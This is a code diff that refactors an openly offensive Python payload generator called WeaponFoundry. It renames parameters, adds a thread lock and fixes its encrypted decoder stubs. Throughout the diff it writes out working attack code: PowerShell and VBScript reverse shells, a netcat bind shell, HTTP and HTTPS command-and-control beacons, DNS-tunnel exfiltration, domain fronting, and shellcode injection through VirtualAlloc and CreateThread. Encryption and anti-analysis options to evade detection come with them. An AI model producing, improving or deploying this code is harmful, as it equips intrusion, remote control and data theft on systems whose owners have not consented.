@@ -15,6 +15,8 @@ import hashlib
 import logging
 import secrets
 import struct
+import threading
+import warnings
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any
@@ -31,6 +33,7 @@ logger = logging.getLogger(__name__)
 
 # Singleton instance
 _weapon_foundry: "WeaponFoundry | None" = None
+_weapon_foundry_lock = threading.Lock()
 
 
 # =============================================================================
@@ -85,7 +88,7 @@ class GeneratedPayload:
     """Result of payload generation."""
 
     payload: bytes
-    format: PayloadFormat
+    output_format: PayloadFormat
     encryption: EncryptionMethod
     key: bytes | None
     decoder_stub: str
@@ -250,6 +253,12 @@ class EncryptionEngine:
             return encrypted, key, None
 
         if method == EncryptionMethod.RC4:
+            warnings.warn(
+                "RC4 is cryptographically weak and deprecated. "
+                "Prefer AES or ChaCha20 for new payloads.",
+                DeprecationWarning,
+                stacklevel=2,
+            )
             encrypted = self.rc4_crypt(data, key)
             return encrypted, key, None
 
@@ -486,10 +495,19 @@ $c.Close()
     @staticmethod
     def get_reverse_shell_vbs(lhost: str, lport: int) -> str:
         """Generate VBScript reverse shell code."""
+        ps_cmd = (
+            f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
+            f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+            f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
+            f"{{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+            f"$r=(iex $d 2>&1|Out-String);"
+            f"$sb=([text.encoding]::ASCII).GetBytes($r);"
+            f"$s.Write($sb,0,$sb.Length)}};$c.Close()"
+        )
         return f'''Set s=CreateObject("WScript.Shell")
 Set o=CreateObject("MSXML2.ServerXMLHTTP.6.0")
 Dim cmd
-cmd="cmd.exe /c powershell -nop -w hidden -c ""$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}};$c.Close()"""
+cmd="cmd.exe /c powershell -nop -w hidden -c ""{ps_cmd}"""
 s.Run cmd,0,False
 '''
 
@@ -750,22 +768,22 @@ except ImportError:
 _k=bytes.fromhex("{key_hex}")
 if len(_k)<32: _k=hashlib.sha256(_k).digest()
 _p=base64.b64decode(_e)
-_n=_p[:16]
-_t=_p[16:32]
-_c=_p[32:]
+_n=_p[:12]
+_t=_p[12:28]
+_c=_p[28:]
 _ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
 exec(_ci.decrypt_and_verify(_c, _t))
 """
 
     @staticmethod
     def get_xor_decoder_powershell(key: bytes) -> str:
-        """Generate PowerShell XOR decoder."""
-        key_int = key[0]
+        """Generate PowerShell XOR decoder (supports multi-byte keys)."""
+        key_b64 = __import__("base64").b64encode(key).decode()
         return f"""
-$k={key_int}
+$kb=[System.Convert]::FromBase64String("{key_b64}")
 $d=[System.Convert]::FromBase64String($e)
 $r=@()
-for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $k}}
+for($i=0;$i -lt $d.Length;$i++){{$r+=$d[$i] -bxor $kb[$i % $kb.Length]}}
 iex([System.Text.Encoding]::ASCII.GetString($r))
 """
 
@@ -833,7 +851,7 @@ class WeaponFoundry:
         shell_type: ShellType,
         lhost: str,
         lport: int,
-        format: PayloadFormat,
+        output_format: PayloadFormat,
     ) -> str:
         """Generate payload using Metasploit if available."""
         if not MetasploitIntegrator.is_available():
@@ -847,7 +865,7 @@ class WeaponFoundry:
         arch = "x64"
         platform = (
             "windows"
-            if format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA]
+            if output_format in [PayloadFormat.POWERSHELL, PayloadFormat.CSHARP, PayloadFormat.HTA]
             else "linux"
         )
 
@@ -855,7 +873,7 @@ class WeaponFoundry:
             platform, arch, msf_payload, lhost, lport, "raw",
         )
 
-        if raw_bytes and format == PayloadFormat.PYTHON:
+        if raw_bytes and output_format == PayloadFormat.PYTHON:
             base = self.templates.get_process_injector_python(shellcode_var="_sc")
             return f"_sc={raw_bytes!s}\n{base}"
         return ""
@@ -866,7 +884,7 @@ class WeaponFoundry:
         lhost: str = "127.0.0.1",
         lport: int = 4444,
         encryption: EncryptionMethod = EncryptionMethod.XOR,
-        format: PayloadFormat = PayloadFormat.PYTHON,
+        output_format: PayloadFormat = PayloadFormat.PYTHON,
         iterations: int = 1,
         anti_sandbox: bool = False,
         anti_debug: bool = False,
@@ -877,16 +895,16 @@ class WeaponFoundry:
         # 1. Try Metasploit generation if requested
         base_payload = ""
         if use_msf:
-            base_payload = self._generate_msf_payload(shell_type, lhost, lport, format)
+            base_payload = self._generate_msf_payload(shell_type, lhost, lport, output_format)
 
         # 2. Native Fallback
         if not base_payload:
-            base_payload = self._generate_base_payload(shell_type, lhost, lport, format)
+            base_payload = self._generate_base_payload(shell_type, lhost, lport, output_format)
 
         # Add anti-analysis if requested
         if anti_sandbox or anti_debug or sleep_seconds > 0:
             base_payload = self._add_anti_analysis(
-                base_payload, format, anti_sandbox, anti_debug, sleep_seconds,
+                base_payload, output_format, anti_sandbox, anti_debug, sleep_seconds,
             )
 
         # Encrypt payload
@@ -905,11 +923,11 @@ class WeaponFoundry:
         # Generate decoder stub (key is guaranteed to be set if encryption was applied)
         decoder_stub = ""
         if key is not None:
-            decoder_stub = self._generate_decoder(encryption, key, format)
+            decoder_stub = self._generate_decoder(encryption, key, output_format)
 
         return GeneratedPayload(
             payload=payload_bytes,
-            format=format,
+            output_format=output_format,
             encryption=encryption,
             key=key,
             decoder_stub=decoder_stub,
@@ -929,122 +947,140 @@ class WeaponFoundry:
         shell_type: ShellType,
         lhost: str,
         lport: int,
-        format: PayloadFormat,
+        output_format: PayloadFormat,
     ) -> str:
         """Generate base payload code."""
-        if shell_type == ShellType.REVERSE_TCP:
-            return self._get_reverse_tcp_payload(format, lhost, lport)
+        # Dispatch table for shell types with dedicated generators
+        _shell_generators = {
+            ShellType.REVERSE_TCP: self._get_reverse_tcp_payload,
+            ShellType.BIND_TCP: self._get_bind_tcp_payload,
+            ShellType.REVERSE_HTTP: self._get_reverse_http_payload,
+            ShellType.REVERSE_HTTPS: self._get_reverse_https_payload,
+            ShellType.DNS_TUNNEL: self._get_dns_tunnel_payload,
+            ShellType.DOMAIN_FRONTED: self._get_domain_fronted_payload,
+        }
 
-        if shell_type == ShellType.BIND_TCP:
-            if format == PayloadFormat.PYTHON:
-                return self.templates.get_bind_shell_python(lport)
-            if format == PayloadFormat.POWERSHELL:
-                return (
-                    f"$l=New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{lport});$l.Start();"
-                    f"$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
-                    f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
-                    f"$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
-                    f";$c.Close();$l.Stop()"
-                )
-            if format == PayloadFormat.BASH:
-                return f"nc -lvp {lport} -e /bin/sh"
-            # Fallback to Python for other formats
-            return self.templates.get_bind_shell_python(lport)
+        generator = _shell_generators.get(shell_type)
+        if generator:
+            return generator(output_format, lhost, lport)
 
-        if shell_type == ShellType.PROCESS_INJECTION and format == PayloadFormat.PYTHON:
+        if shell_type == ShellType.PROCESS_INJECTION and output_format == PayloadFormat.PYTHON:
             return self._get_process_injection_payload(lhost, lport)
 
-        if shell_type == ShellType.REVERSE_HTTP:
-            # HTTP reverse shell — uses a simple HTTP callback loop
-            return (
-                f"import urllib.request, subprocess, time\n"
-                f"while True:\n"
-                f"    try:\n"
-                f"        cmd = urllib.request.urlopen('http://{lhost}:{lport}/cmd').read().decode()\n"
-                f"        out = subprocess.getoutput(cmd)\n"
-                f"        urllib.request.urlopen('http://{lhost}:{lport}/out', out.encode())\n"
-                f"    except Exception: pass\n"
-                f"    time.sleep(5)\n"
-            )
-
-        if shell_type == ShellType.REVERSE_HTTPS:
-            return (
-                f"import urllib.request, subprocess, time, ssl\n"
-                f"ctx = ssl._create_unverified_context()\n"
-                f"while True:\n"
-                f"    try:\n"
-                f"        cmd = urllib.request.urlopen('https://{lhost}:{lport}/cmd', context=ctx).read().decode()\n"
-                f"        out = subprocess.getoutput(cmd)\n"
-                f"        urllib.request.urlopen('https://{lhost}:{lport}/out', out.encode(), context=ctx)\n"
-                f"    except Exception: pass\n"
-                f"    time.sleep(5)\n"
-            )
-
-        if shell_type == ShellType.DNS_TUNNEL:
-            return (
-                f"import subprocess, base64, socket\n"
-                f"def dns_exfil(data: bytes) -> None:\n"
-                f"    encoded = base64.b32encode(data).decode().strip('=')\n"
-                f"    for i in range(0, len(encoded), 60):\n"
-                f"        label = encoded[i:i+60]\n"
-                f"        try: socket.getaddrinfo(f'{{label}}.data.{lhost}', None)\n"
-                f"        except socket.gaierror: pass\n"
-                f"out = subprocess.getoutput('whoami')\n"
-                f"dns_exfil(out.encode())\n"
-            )
-
-        if shell_type == ShellType.DOMAIN_FRONTED:
-            return (
-                f"import urllib.request, subprocess\n"
-                f"req = urllib.request.Request('https://{lhost}:{lport}/beacon')\n"
-                f"req.add_header('Host', '{lhost}')  # fronted host\n"
-                f"while True:\n"
-                f"    try:\n"
-                f"        cmd = urllib.request.urlopen(req).read().decode()\n"
-                f"        out = subprocess.getoutput(cmd)\n"
-                f"        urllib.request.urlopen(req, out.encode())\n"
-                f"    except Exception: pass\n"
-            )
-
-        if shell_type == ShellType.REFLECTIVE_DLL_INJECTION and format == PayloadFormat.PYTHON:
-            sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
-            sc_repr = str(sc)
-            return (
-                f"import ctypes\n"
-                f"sc = {sc_repr}\n"
-                f"buf = ctypes.create_string_buffer(sc, len(sc))\n"
-                f"ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
-                f"p = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
-                f"ctypes.memmove(p, buf, len(sc))\n"
-                f"ctypes.windll.kernel32.CreateThread(0, 0, p, 0, 0, 0)\n"
-                f"ctypes.windll.kernel32.WaitForSingleObject(-1, -1)\n"
-            )
+        if shell_type == ShellType.REFLECTIVE_DLL_INJECTION and output_format == PayloadFormat.PYTHON:
+            return self._get_reflective_dll_payload(lhost, lport)
 
         return self.templates.get_reverse_shell_python(lhost, lport)
 
+    def _get_bind_tcp_payload(self, output_format: PayloadFormat, lhost: str, lport: int) -> str:
+        """Return bind TCP payload for the requested format."""
+        if output_format == PayloadFormat.PYTHON:
+            return self.templates.get_bind_shell_python(lport)
+        if output_format == PayloadFormat.POWERSHELL:
+            return (
+                f"$l=New-Object System.Net.Sockets.TcpListener([IPAddress]::Any,{lport});$l.Start();"
+                f"$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                f"$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)}}"
+                f";$c.Close();$l.Stop()"
+            )
+        if output_format == PayloadFormat.BASH:
+            return f"nc -lvp {lport} -e /bin/sh"
+        return self.templates.get_bind_shell_python(lport)
+
+    def _get_reverse_http_payload(self, output_format: PayloadFormat, lhost: str, lport: int) -> str:
+        """Return HTTP reverse shell payload."""
+        return (
+            f"import urllib.request, subprocess, time\n"
+            f"while True:\n"
+            f"    try:\n"
+            f"        cmd = urllib.request.urlopen('http://{lhost}:{lport}/cmd').read().decode()\n"
+            f"        out = subprocess.getoutput(cmd)\n"
+            f"        urllib.request.urlopen('http://{lhost}:{lport}/out', out.encode())\n"
+            f"    except Exception: pass\n"
+            f"    time.sleep(5)\n"
+        )
+
+    def _get_reverse_https_payload(self, output_format: PayloadFormat, lhost: str, lport: int) -> str:
+        """Return HTTPS reverse shell payload."""
+        return (
+            f"import urllib.request, subprocess, time, ssl\n"
+            f"ctx = ssl._create_unverified_context()\n"
+            f"while True:\n"
+            f"    try:\n"
+            f"        cmd = urllib.request.urlopen('https://{lhost}:{lport}/cmd', context=ctx).read().decode()\n"
+            f"        out = subprocess.getoutput(cmd)\n"
+            f"        urllib.request.urlopen('https://{lhost}:{lport}/out', out.encode(), context=ctx)\n"
+            f"    except Exception: pass\n"
+            f"    time.sleep(5)\n"
+        )
+
+    def _get_dns_tunnel_payload(self, output_format: PayloadFormat, lhost: str, lport: int) -> str:
+        """Return DNS tunnel payload."""
+        return (
+            f"import subprocess, base64, socket\n"
+            f"def dns_exfil(data: bytes) -> None:\n"
+            f"    encoded = base64.b32encode(data).decode().strip('=')\n"
+            f"    for i in range(0, len(encoded), 60):\n"
+            f"        label = encoded[i:i+60]\n"
+            f"        try: socket.getaddrinfo(f'{{label}}.data.{lhost}', None)\n"
+            f"        except socket.gaierror: pass\n"
+            f"out = subprocess.getoutput('whoami')\n"
+            f"dns_exfil(out.encode())\n"
+        )
+
+    def _get_domain_fronted_payload(self, output_format: PayloadFormat, lhost: str, lport: int) -> str:
+        """Return domain-fronted payload."""
+        return (
+            f"import urllib.request, subprocess\n"
+            f"req = urllib.request.Request('https://{lhost}:{lport}/beacon')\n"
+            f"req.add_header('Host', '{lhost}')  # fronted host\n"
+            f"while True:\n"
+            f"    try:\n"
+            f"        cmd = urllib.request.urlopen(req).read().decode()\n"
+            f"        out = subprocess.getoutput(cmd)\n"
+            f"        urllib.request.urlopen(req, out.encode())\n"
+            f"    except Exception: pass\n"
+        )
+
+    def _get_reflective_dll_payload(self, lhost: str, lport: int) -> str:
+        """Return reflective DLL injection payload."""
+        sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
+        sc_repr = str(sc)
+        return (
+            f"import ctypes\n"
+            f"sc = {sc_repr}\n"
+            f"buf = ctypes.create_string_buffer(sc, len(sc))\n"
+            f"ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p\n"
+            f"p = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)\n"
+            f"ctypes.memmove(p, buf, len(sc))\n"
+            f"ctypes.windll.kernel32.CreateThread(0, 0, p, 0, 0, 0)\n"
+            f"ctypes.windll.kernel32.WaitForSingleObject(-1, -1)\n"
+        )
+
     def _get_reverse_tcp_payload(
         self,
-        format: PayloadFormat,
+        output_format: PayloadFormat,
         lhost: str,
         lport: int,
     ) -> str:
         """Return reverse TCP payload for the requested format."""
-        if format == PayloadFormat.RAW:
+        if output_format == PayloadFormat.RAW:
             sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
             return sc.hex() if sc else "# shellcode generation failed"
-        if format == PayloadFormat.PYTHON:
+        if output_format == PayloadFormat.PYTHON:
             return self.templates.get_reverse_shell_python(lhost, lport)
-        if format == PayloadFormat.POWERSHELL:
+        if output_format == PayloadFormat.POWERSHELL:
             return self.templates.get_reverse_shell_powershell(lhost, lport)
-        if format == PayloadFormat.BASH:
+        if output_format == PayloadFormat.BASH:
             return self.templates.get_reverse_shell_bash(lhost, lport)
-        if format == PayloadFormat.VBS:
+        if output_format == PayloadFormat.VBS:
             return self.templates.get_reverse_shell_vbs(lhost, lport)
-        if format == PayloadFormat.HTA:
+        if output_format == PayloadFormat.HTA:
             return self.templates.get_reverse_shell_hta(lhost, lport)
-        if format == PayloadFormat.CSHARP:
+        if output_format == PayloadFormat.CSHARP:
             return self.templates.get_reverse_shell_csharp(lhost, lport)
-        if format == PayloadFormat.C:
+        if output_format == PayloadFormat.C:
             sc = self.shellcode_gen.get_windows_x64_reverse_tcp(lhost, lport)
             hex_bytes = ", ".join(f"0x{b:02x}" for b in sc) if sc else "/* failed */"
             return (
@@ -1074,7 +1110,7 @@ class WeaponFoundry:
     def _add_anti_analysis(
         self,
         payload: str,
-        format: PayloadFormat,
+        output_format: PayloadFormat,
         anti_sandbox: bool,
         anti_debug: bool,
         sleep_seconds: int,
@@ -1082,7 +1118,7 @@ class WeaponFoundry:
         """Add anti-analysis checks to payload."""
         prefix = ""
 
-        if format == PayloadFormat.PYTHON:
+        if output_format == PayloadFormat.PYTHON:
             if sleep_seconds > 0:
                 prefix += self.anti_analysis.get_sleep_check_python(sleep_seconds)
             if anti_sandbox:
@@ -1096,13 +1132,13 @@ class WeaponFoundry:
         self,
         encryption: EncryptionMethod,
         key: bytes,
-        format: PayloadFormat,
+        output_format: PayloadFormat,
     ) -> str:
         """Generate decoder stub for encrypted payload."""
         if encryption == EncryptionMethod.NONE:
             return ""
 
-        if format == PayloadFormat.PYTHON:
+        if output_format == PayloadFormat.PYTHON:
             if encryption in (EncryptionMethod.XOR, EncryptionMethod.XOR_MULTI):
                 return self.decoder.get_xor_decoder_python(key)
             if encryption == EncryptionMethod.RC4:
@@ -1112,7 +1148,7 @@ class WeaponFoundry:
             if encryption == EncryptionMethod.CHACHA20:
                 return self.decoder.get_chacha20_decoder_python(key)
 
-        elif format == PayloadFormat.POWERSHELL:
+        elif output_format == PayloadFormat.POWERSHELL:
             if encryption == EncryptionMethod.XOR:
                 return self.decoder.get_xor_decoder_powershell(key)
 
@@ -1132,13 +1168,13 @@ class WeaponFoundry:
         """
         encoded = base64.b64encode(generated.payload).decode()
 
-        if generated.format == PayloadFormat.PYTHON:
+        if generated.output_format == PayloadFormat.PYTHON:
             return f'_e="{encoded}"\n{generated.decoder_stub}'
 
-        if generated.format == PayloadFormat.POWERSHELL:
+        if generated.output_format == PayloadFormat.POWERSHELL:
             return f'$e="{encoded}"\n{generated.decoder_stub}'
 
-        if generated.format == PayloadFormat.BASH:
+        if generated.output_format == PayloadFormat.BASH:
             return f'echo "{encoded}" | base64 -d | bash'
 
         return encoded
@@ -1172,7 +1208,9 @@ def get_weapon_foundry() -> WeaponFoundry:
     """
     global _weapon_foundry
     if _weapon_foundry is None:
-        _weapon_foundry = WeaponFoundry()
+        with _weapon_foundry_lock:
+            if _weapon_foundry is None:
+                _weapon_foundry = WeaponFoundry()
     return _weapon_foundry
 
 
@@ -1180,7 +1218,7 @@ def quick_forge(
     lhost: str,
     lport: int = 4444,
     encryption: str = "xor",
-    format: str = "python",
+    output_format: str = "python",
 ) -> str:
     """Quick payload generation.
 
@@ -1188,7 +1226,7 @@ def quick_forge(
         lhost: Listener host
         lport: Listener port
         encryption: Encryption method name
-        format: Output format name
+        output_format: Output format name
 
     Returns:
         Ready-to-use payload string
@@ -1197,8 +1235,8 @@ def quick_forge(
     foundry = get_weapon_foundry()
 
     enc_method = EncryptionMethod(encryption)
-    fmt = PayloadFormat(format)
+    fmt = PayloadFormat(output_format)
 
-    payload = foundry.forge(lhost=lhost, lport=lport, encryption=enc_method, format=fmt)
+    payload = foundry.forge(lhost=lhost, lport=lport, encryption=enc_method, output_format=fmt)
 
     return foundry.get_final_payload(payload)
